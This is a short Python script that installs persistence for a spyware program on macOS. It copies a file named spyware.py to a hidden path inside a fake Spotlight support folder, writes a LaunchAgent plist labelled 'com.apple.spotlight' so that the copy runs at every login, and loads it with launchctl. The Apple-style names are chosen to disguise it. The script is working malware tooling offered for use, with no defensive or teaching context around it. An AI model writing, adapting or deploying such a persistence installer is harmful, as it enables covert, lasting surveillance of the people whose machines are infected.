import os
import plistlib
import getpass
import subprocess
from pathlib import Path
import shutil

def setup_persistence():
    user = getpass.getuser()

    # 1. Paths
    hidden_spy_path = f"/Users/{user}/Library/ApplicationSupport/com.apple.Spotlight/.spot.py"
    plist_path = f"/Users/{user}/Library/LaunchAgents/com.apple.spotlight.plist"
    python_path = "/Library/Frameworks/Python.framework/Versions/3.13/bin/python3"
    source_spyware = os.path.abspath("spyware.py")

    # 2. Create hidden dir if not exists
    os.makedirs(os.path.dirname(hidden_spy_path), exist_ok=True)

    # 3. Copy spyware.py as hidden .spot.py
    shutil.copy(source_spyware, hidden_spy_path)

    # 4. Define plist contents
    plist_data = {
        "Label": "com.apple.spotlight",
        "ProgramArguments": [python_path, hidden_spy_path],
        "RunAtLoad": True
    }

    # 5. Write plist file
    with open(plist_path, "wb") as f:
        plistlib.dump(plist_data, f)

    # 6. Load with launchctl
    try:
        subprocess.run(["launchctl", "bootstrap", f"gui/{os.getuid()}", plist_path], check=True)
        print("[+] Persistence installed successfully.")
    except subprocess.CalledProcessError as e:
        print(f"[!] Failed to load LaunchAgent: {e}")

if __name__ == "__main__":
    setup_persistence()
